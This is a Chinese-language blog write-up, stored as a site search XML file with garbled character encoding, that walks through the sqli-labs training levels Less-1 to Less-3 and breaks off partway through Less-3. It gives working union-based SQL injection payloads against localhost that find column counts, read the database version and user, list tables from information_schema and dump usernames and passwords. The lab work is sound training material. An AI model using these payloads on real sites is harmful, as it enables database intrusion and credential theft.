<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqli-lab(æ‰‹å·¥æ³¨å…¥ç¯‡)</title>
      <link href="/2023/07/05/sqli-lab-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2023/07/05/sqli-lab-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç‹ ç‹ åœ°ç»™æˆ‘æ³¨å…¥ğŸ’‰</p></blockquote><span id="more"></span><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><blockquote><p>GET - Error based - Single quotes - String</p></blockquote><h2 id="ä¸€ã€é¢˜ç›®ç¯å¢ƒ"><a href="#ä¸€ã€é¢˜ç›®ç¯å¢ƒ" class="headerlink" title="ä¸€ã€é¢˜ç›®ç¯å¢ƒ"></a>ä¸€ã€é¢˜ç›®ç¯å¢ƒ</h2><p>æ‰“å¼€é¶åœºLevel1å¦‚å›¾æ‰€ç¤ºï¼š<br><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA1.png"></p><h2 id="äºŒã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥"><a href="#äºŒã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥" class="headerlink" title="äºŒã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥"></a>äºŒã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥</h2><blockquote><p>Please input the ID as parameter with numeric value.</p></blockquote><p>ç”±é¢˜ç›®çš„æé†’ï¼Œæˆ‘ä»¬è¯•ç€è¾“å…¥æ‰‹åŠ¨è¾“å…¥idæ¥è§‚å¯Ÿé¡µé¢æ˜¯å¦æœ‰å›æ˜¾æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA2.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA3.png"></p><p>é€šè¿‡è¾“å…¥ä¸åŒçš„idå€¼ï¼Œæˆ‘ä»¬å‘ç°é¡µé¢æœ‰äº†å›æ˜¾å¹¶ä¸”è¿”å›çš„å†…å®¹ä¹Ÿä¸ç›¸åŒï¼Œè¿™è¯´æ˜å­˜åœ¨æˆ‘ä»¬åˆšæ‰è¾“å…¥çš„å†…å®¹æ˜¯ä»£å…¥æ•°æ®åº“ä¸­å»æ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤äº†ã€‚å³æ­¤é¡µé¢å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p><h2 id="ä¸‰ã€åˆ¤æ–­ç±»å‹"><a href="#ä¸‰ã€åˆ¤æ–­ç±»å‹" class="headerlink" title="ä¸‰ã€åˆ¤æ–­ç±»å‹"></a>ä¸‰ã€åˆ¤æ–­ç±»å‹</h2><ul><li>æ ¹æ®å‚æ•°ç±»å‹ï¼šå­—ç¬¦å‹ï¼Œæ•°å­—å‹ã€æœç´¢å‹</li><li>æ ¹æ®æäº¤æ–¹å¼ï¼šPOSTæ³¨å…¥ï¼ŒGETæ³¨å…¥ï¼ŒHTTP HEADæ³¨å…¥</li><li>æ ¹æ®æœ‰æ— å›æ˜¾ï¼šè”åˆæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œå¸ƒå°”ç›²æ³¨ï¼Œå»¶æ—¶æ³¨å…¥</li><li>å…¶ä»–æ³¨å…¥ï¼šå †å æ³¨å…¥ï¼Œå®½å­—èŠ‚æ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥ç­‰</li></ul><p>åœ¨è¿™é‡Œç”±äºæ˜¯level1ä¸”åˆå­¦ï¼Œæˆ‘ä»¬ä»…è€ƒè™‘å‚æ•°ç±»å‹ä¸­çš„å­—ç¬¦å‹å’Œæ•°å­—å‹ã€‚</p><h3 id="1-åˆ¤æ–­æ¼æ´ç±»å‹æ˜¯å¦æ˜¯æ•°å­—å‹"><a href="#1-åˆ¤æ–­æ¼æ´ç±»å‹æ˜¯å¦æ˜¯æ•°å­—å‹" class="headerlink" title="1.åˆ¤æ–­æ¼æ´ç±»å‹æ˜¯å¦æ˜¯æ•°å­—å‹"></a>1.åˆ¤æ–­æ¼æ´ç±»å‹æ˜¯å¦æ˜¯æ•°å­—å‹</h3><blockquote><p>å½“è¾“å…¥çš„å‚æ•°ä¸ºæ•´å‹æ—¶ï¼ŒSQLè¯­å¥ç±»å‹å¤§è‡´å¦‚ä¸‹ï¼š<br>select * from &lt;è¡¨å&gt; where id = x<br>è¿™ç§ç±»å‹å¯ä»¥ä½¿ç”¨ <strong>and 1=1</strong> å’Œ <strong>and 1=2</strong> æ¥è¿›è¡Œåˆ¤æ–­ï¼š</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> é¡µé¢ä¾æ—§è¿è¡Œæ­£å¸¸ï¼Œç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</span><br><span class="line"></span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> é¡µé¢è¿è¡Œé”™è¯¯ï¼Œåˆ™è¯´æ˜æ­¤<span class="keyword">SQL</span>æ³¨å…¥ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚è‹¥é¡µé¢ä¾æ—§è¿è¡Œæ­£å¸¸ï¼Œåˆ™æ¼æ´ç±»å‹ä¸æ˜¯æ•°å­—å‹</span><br><span class="line"></span><br><span class="line">åœ¨åå°æ‰§è¡Œçš„<span class="keyword">SQL</span>è¯­å¥å¤§è‡´å¦‚ä¸‹:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>è¡¨å<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>è¡¨å<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA4.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA5.png"></p><p>æ ¹æ®å›æ˜¾å¯å¾—ï¼Œè¯¥SQLæ³¨å…¥æ¼æ´ä¸æ˜¯æ•°å­—å‹ã€‚</p><h3 id="2-åˆ¤æ–­æ¼æ´ç±»å‹æ˜¯å¦æ˜¯å­—ç¬¦å‹"><a href="#2-åˆ¤æ–­æ¼æ´ç±»å‹æ˜¯å¦æ˜¯å­—ç¬¦å‹" class="headerlink" title="2.åˆ¤æ–­æ¼æ´ç±»å‹æ˜¯å¦æ˜¯å­—ç¬¦å‹"></a>2.åˆ¤æ–­æ¼æ´ç±»å‹æ˜¯å¦æ˜¯å­—ç¬¦å‹</h3><blockquote><p>å½“è¾“å…¥çš„å‚æ•°ä¸ºå­—ç¬¦å‹æ—¶ï¼ŒSQL è¯­å¥ç±»å‹å¤§è‡´å¦‚ä¸‹ï¼š<br>select * from &lt;è¡¨å&gt; where id = â€˜xâ€™<br>è¿™ç§ç±»å‹æˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨ and â€˜1â€™=â€™1 å’Œ and â€˜1â€™=â€™2æ¥åˆ¤æ–­ï¼š</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> é¡µé¢è¿è¡Œæ­£å¸¸ï¼Œç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span> é¡µé¢è¿è¡Œé”™è¯¯ï¼Œåˆ™è¯´æ˜æ­¤ <span class="keyword">Sql</span> æ³¨å…¥ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚</span><br><span class="line"></span><br><span class="line">å¯ä»¥ç®€åŒ–æˆï¼š</span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and 1=1 --+é¡µé¢è¿è¡Œæ­£å¸¸ï¼Œç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</span></span><br><span class="line"><span class="string">url/?id= x&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+ é¡µé¢è¿è¡Œé”™è¯¯ï¼Œåˆ™è¯´æ˜æ­¤ Sql æ³¨å…¥ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚</span></span><br><span class="line">åœ¨åå°æ‰§è¡Œçš„<span class="keyword">SQL</span>è¯­å¥å¤§è‡´å¦‚ä¸‹:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>è¡¨å<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>è¡¨å<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA7.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA8.png"></p><p>æ ¹æ®å›æ˜¾å¯å¾—, è¯¥SQLæ³¨å…¥æ¼æ´æ˜¯å­—ç¬¦å‹.</p><h2 id="å››ã€å¼€å§‹æ³¨å…¥"><a href="#å››ã€å¼€å§‹æ³¨å…¥" class="headerlink" title="å››ã€å¼€å§‹æ³¨å…¥"></a>å››ã€å¼€å§‹æ³¨å…¥</h2><p>ç”±äºé¶åœºä¸æ”¯æŒ#å·çš„æ³¨é‡Šæ–¹æ³•,æˆ‘ä»¬é‡‡ç”¨â€“+çš„æ³¨é‡Šæ–¹æ³•.</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA6.png"></p><h3 id="1-è·å–è¡¨æ ¼æœ‰å‡ åˆ—"><a href="#1-è·å–è¡¨æ ¼æœ‰å‡ åˆ—" class="headerlink" title="1.è·å–è¡¨æ ¼æœ‰å‡ åˆ—"></a>1.è·å–è¡¨æ ¼æœ‰å‡ åˆ—</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåªæœ‰ä»1~næŒ¨ä¸ªå»è¯•,æœ‰æ—¶å€™è¿æ°”å¥½å¯èƒ½è¯•çš„æ¬¡æ•°å°‘ä¸€ç‚¹.</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA9.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA10.png"></p><p>æ‰€ä»¥,è¿™ä¸ªè¡¨æ ¼ç”±ä¸‰åˆ—ç»„æˆ.</p><blockquote><p><strong>order byè¯­æ³•ï¼š</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> æ•°å­— <span class="operator">|</span> åˆ—å [ <span class="keyword">ASC</span> , [ <span class="keyword">DESC</span> ] ]</span><br></pre></td></tr></table></figure><p>1ã€order byï¼šå¯¹æŸ¥è¯¢ç»“æœæŒ‰ç…§æŒ‡å®šåˆ—è¿›è¡Œæ’åºï¼ŒæŒ‡å®šåˆ—çš„æ–¹å¼æœ‰ä¸¤ç§ï¼šæ•°å­—æˆ–åˆ—å</p><p>2ã€ASCï¼šå‡åºæ’åˆ—ï¼Œé»˜è®¤ä¸ºASC</p><p>3ã€DESCï¼šé™åºæ’åˆ—</p><p> æ³¨æ„ï¼š<strong>ä»¥æ•°å­—æ–¹å¼æŒ‡å®šæ’åºåˆ—æ—¶ï¼Œæ•°å­—ä¸èƒ½è¶…è¿‡åˆ—çš„æ€»æ•°</strong>ï¼Œåˆ©ç”¨è¯¥ç‰¹æ€§åœ¨è¿›è¡ŒSQLæ³¨å…¥çš„æ—¶å€™å¯ä»¥åˆ¤æ–­æ•°æ®åº“çš„å­—æ®µæ•°é‡</p></blockquote><h3 id="2-çˆ†å‡ºæ˜¾ç¤ºä½"><a href="#2-çˆ†å‡ºæ˜¾ç¤ºä½" class="headerlink" title="2.çˆ†å‡ºæ˜¾ç¤ºä½"></a>2.çˆ†å‡ºæ˜¾ç¤ºä½</h3><blockquote><p>æ˜¾ç¤ºä½å°±æ˜¯ç½‘é¡µä¸­èƒ½å¤Ÿæ˜¾ç¤ºæ•°æ®çš„ä½ç½®ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼Œæ¯”å¦‚æˆ‘ä»¬é€šè¿‡order byå‘½ä»¤çŸ¥é“äº†è¡¨çš„åˆ—æ•°ä¸º11ã€‚ç„¶åå†ä½¿ç”¨union select 1,2,3â€¦,11 from tableï¼Œç½‘é¡µä¸­æ˜¾ç¤ºäº†ä¿¡æ¯8ï¼Œé‚£ä¹ˆè¯´æ˜ç½‘é¡µåªèƒ½å¤Ÿæ˜¾ç¤ºç¬¬8åˆ—ä¸­ä¿¡æ¯ï¼Œä¸èƒ½æ˜¾ç¤ºå…¶ä»–åˆ—çš„ä¿¡æ¯ã€‚ä¹Ÿå¯ä»¥ç†è§£ä¸ºç½‘é¡µåªå¼€æ”¾äº†8è¿™ä¸ªçª—å£ï¼Œä½ æƒ³è¦æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯å°±å¿…é¡»è¦é€šè¿‡è¿™ä¸ªçª—å£ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦çŸ¥é“æŸä¸ªå±æ€§çš„å€¼ï¼Œæ¯”å¦‚admin,å°±è¦æŠŠadminå±æ€§æ”¾åˆ°8çš„ä½ç½®ä¸Šï¼Œè¿™æ ·å°±èƒ½é€šè¿‡ç¬¬8åˆ—çˆ†å‡ºadminçš„ä¿¡æ¯ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure><blockquote><p><strong>ä¸ºä»€ä¹ˆè¿™é‡Œè¦ç»™idèµ‹å€¼ä¸º-1å‘¢?</strong></p><p>å¦‚æœid=1çš„æ•°æ®è¢«æŸ¥è¯¢å‡ºæ¥ï¼Œè¿”å›åˆ°é¡µé¢ä¸­ï¼Œå°±å æ®äº†ä¸¤ä¸ªå›æ˜¾ä½,å¯¼è‡´åç»­çš„æŸ¥è¯¢çš„å†…å®¹æ— æ³•å›æ˜¾åˆ°é¡µé¢ä¸­,æ‰€ä»¥å°±æ˜¯ä¸“é—¨ä¸è®©idæ­£ç¡®ä»è€Œèƒ½å¤Ÿè®©åç»­æŸ¥è¯¢è¯­å¥èƒ½å¤Ÿæ­£å¸¸å›æ˜¾.</p></blockquote><h3 id="3-çˆ†å‡ºåº“åå’Œç‰ˆæœ¬æˆ–æ“ä½œç³»ç»Ÿå’Œç”¨æˆ·å"><a href="#3-çˆ†å‡ºåº“åå’Œç‰ˆæœ¬æˆ–æ“ä½œç³»ç»Ÿå’Œç”¨æˆ·å" class="headerlink" title="3.çˆ†å‡ºåº“åå’Œç‰ˆæœ¬æˆ–æ“ä½œç³»ç»Ÿå’Œç”¨æˆ·å"></a>3.çˆ†å‡ºåº“åå’Œç‰ˆæœ¬æˆ–æ“ä½œç³»ç»Ÿå’Œç”¨æˆ·å</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,database(),version()--+</span></span><br><span class="line"><span class="string">url/?id=-1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,@<span class="variable">@version</span>_compile_os,<span class="keyword">user</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA11.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.1n2ch975ei80.webp"></p><blockquote><p>database(),version()éƒ½æ˜¯sqlä¸­çš„å‡½æ•°.</p><p>è¿™é‡Œå°†2,3æ¢ä¸ºdatabase()å’Œversion()æ˜¯å› ä¸º2,3æ‰æ˜¯æ˜¾ç¤ºä½.</p></blockquote><h3 id="4-çˆ†å‡ºè¡¨å"><a href="#4-çˆ†å‡ºè¡¨å" class="headerlink" title="4.çˆ†å‡ºè¡¨å"></a>4.çˆ†å‡ºè¡¨å</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.b0j47d12sjk.webp"></p><p><strong>1.group_concatå‡½æ•°</strong></p><p> â€‹    group_concatå‡½æ•°æ˜¯å°†æŸ¥è¯¢åˆ°çš„æ¯è¡Œç»“æœä»¥æŸä¸ªå­—æ®µåè¿›è¡Œåˆå¹¶ï¼Œæ¯ä¸€è¡Œåˆå¹¶çš„ç»“æœä»¥é€—å·åˆ†éš”å¼€ï¼Œå¦‚æœé€—å·çœ‹ä¸æ¸…æ¥šçš„è¯ï¼Œå¯ä»¥è‡ªå®šä¹‰åˆ†éš”ç¬¦å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name,&#x27;æˆ‘æ˜¯åˆ†éš”ç¬¦&#x27;)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.27orjr0g48ow.webp"></p><p> <strong>2.information_schemaæ•°æ®åº“</strong></p><p> â€‹    information_schemaæ˜¯mysqlè‡ªå¸¦çš„ä¸€ä¸ªä¿¡æ¯æ•°æ®åº“ï¼Œä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚åœ¨information_schemaæ•°æ®åº“ä¸­è¿˜å¯ä»¥åˆ©ç”¨çš„è¡¨å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">schema_name</th><th align="center">å‚¨å­˜äº†æ‰€æœ‰æ•°æ®åº“çš„åº“å</th></tr></thead><tbody><tr><td align="center"><strong>table_schema</strong></td><td align="center"><strong>å‚¨å­˜äº†æ•°æ®åº“å</strong></td></tr><tr><td align="center"><strong>tables</strong></td><td align="center"><strong>å‚¨å­˜äº†æ•°æ®åº“åº“åï¼Œä»¥åŠè¯¥åº“ä¸­åŒ…å«çš„è¡¨å</strong></td></tr><tr><td align="center"><strong>table_name</strong></td><td align="center"><strong>å‚¨å­˜äº†è¡¨å</strong></td></tr></tbody></table><h3 id="5-çˆ†å‡ºå­—æ®µå†…å®¹"><a href="#5-çˆ†å‡ºå­—æ®µå†…å®¹" class="headerlink" title="5.çˆ†å‡ºå­—æ®µå†…å®¹"></a>5.çˆ†å‡ºå­—æ®µå†…å®¹</h3><blockquote><p>ç”±äºåœ¨çˆ†è¡¨æ—¶å€™æˆ‘ä»¬å‘ç°äº†å…³é”®è¡¨â€˜usersâ€™ï¼Œäºæ˜¯æˆ‘ä»¬ç°åœ¨å»æŸ¥ä¸€æŸ¥å®ƒå…¶ä¸­çš„å­—æ®µ</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.3qemwe8cioxs.webp"></p><p>å‘ç°äº†å…³é”®å­—æ®µï¼Œç°åœ¨æˆ‘ä»¬æ¥çˆ†å‡ºå­—æ®µçš„å†…å®¹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span><span class="comment">--&#x27;),group_concat(password,&#x27;--&#x27;) from users--+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.537toufrxm9s.webp"></p><p>æˆåŠŸè·å–å…³é”®æ•°æ®ã€‚</p><h2 id="äº”ã€åè®°"><a href="#äº”ã€åè®°" class="headerlink" title="äº”ã€åè®°"></a>äº”ã€åè®°</h2><p>â€‹    è¿™é“é¢˜è™½ç„¶ä¸éš¾ä½†æ˜¯èŠ±äº†æˆ‘æŒºå¤šçš„æ—¶é—´ï¼Œå¾ˆå¤§éƒ¨åˆ†æ˜¯æˆ‘å¯¹æ•°æ®åº“å¤ªä¸ç†Ÿæ‚‰äº†ï¼šè¡¨ã€è¡Œã€åˆ—ã€å­—æ®µä¹‹é—´çš„å…³ç³»ç­‰ç­‰ï¼Œä¸‹é¢æ”¾ä¸€äº›èµ„æ–™å§ï¼š</p><ol><li><a class="link" href="https://blog.csdn.net/m0_63550462/article/details/121206926?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%92%8C%E5%88%97&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121206926.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">è¡¨ã€åˆ—ã€è¡Œã€æ³¨è§£ç­‰è®²è§£<i class="fas fa-external-link-alt"></i></a></li><li>æ•°æ®åº“å­—æ®µæ˜¯æ˜¯ä»€ä¹ˆï¼Ÿæ¯ä¸ªå­—æ®µç”±è‹¥å¹²æŒ‰ç…§æŸç§ç•Œé™åˆ’åˆ†çš„ç›¸åŒæ•°æ®ç±»å‹çš„æ•°æ®é¡¹ç»„æˆ.é€šå¸¸åœ¨è¡¨ä¸­ä¸ºâ€œåˆ—â€</li><li><a class="link" href="https://blog.csdn.net/qq_44159028/article/details/114325805?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167339772016800217031196%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167339772016800217031196&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-114325805-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">SQLæ³¨å…¥è¯¦è§£<i class="fas fa-external-link-alt"></i></a></li></ol><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><blockquote><p>GET - Error based - Intiger based</p></blockquote><p>â€‹    åŒLess-1,åªä¸è¿‡æ˜¯æ•°å­—å‹SQLæ³¨å…¥ï¼Œå°‘äº†å¼•å·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--------------------æŸ¥è¡¨--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 </span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()</span><br><span class="line">--+</span><br><span class="line">--------------------æŸ¥è¡¨å­—æ®µ/å±æ€§--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;</span><br><span class="line">--+</span><br><span class="line">--------------------æŸ¥è¡¨å­—æ®µ/å±æ€§çš„å†…å®¹--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 union select 1,group_concat(username,&quot;--&quot;),group_concat(password,&quot;--&quot;) from users</span><br><span class="line">--+</span><br></pre></td></tr></table></figure><p><strong>å°Tips</strong>ï¼šå¯ä»¥åœ¨æœ¬åœ°ç”¨navicatè¿æ¥å¥½æˆ‘ä»¬è¦æŸ¥è¯¢çš„æ•°æ®åº“ï¼Œç„¶åè§‰å¾—æŠ½è±¡çš„éƒ¨åˆ†å°±æ‹¿ç€æœ¬åœ°çš„æ•°æ®åº“ä¸­çš„ç»“æ„å»å†™SQLè¯­å¥ã€‚</p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><blockquote><p>GET - Error based - Single quotes with twist â€“string</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQLlabs/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">http://localhost/SQLlabs/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">--------------------åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥--------------------</span><br></pre></td></tr></table></figure><p>ç»§ç»­æ³¨å…¥æˆ‘ä»¬å‘ç°ï¼ŒLess-1çš„æ–¹æ³•ä¼šæŠ¥é”™ï¼ŒæŸ¥çœ‹phpæºç å‘ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç”±äºå°†æ³¨å…¥çš„éƒ¨åˆ†ç”¨äº†æ‹¬å·æ•´ä½“æ‹¬èµ·æ¥ï¼Œæˆ‘ä»¬ç°åœ¨è¦å®ç°æ³¨å…¥çš„è¯å°±å¾—æ›´æ”¹ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;$id&#x27;)</span><br><span class="line">--------------------å‡è®¾æ³¨å…¥å¦‚ä¸‹--------------------</span><br><span class="line">?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">--------------------å¾—åˆ°ç»“æœå¦‚ä¸‹--------------------</span><br><span class="line">(&#x27;-1&#x27; union select 1,database(),version() --+&#x27;)</span><br><span class="line">//è¿™æ ·å°±ä¼šå­˜åœ¨æ‹¬å·ç¼ºå¤±ï¼Œæˆ‘ä»¬æå‰ç»“æŸæ‹¬å·å°±èƒ½æ³¨å…¥æˆåŠŸ</span><br><span class="line">--------------------åº”å½“æ³¨å…¥å¦‚ä¸‹--------------------</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version() --+</span><br><span class="line">--------------------å¾—åˆ°ç»“æœå¦‚ä¸‹--------------------</span><br><span class="line">(&#x27;-1&#x27;) union select 1,database(),version() --+&#x27;)</span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 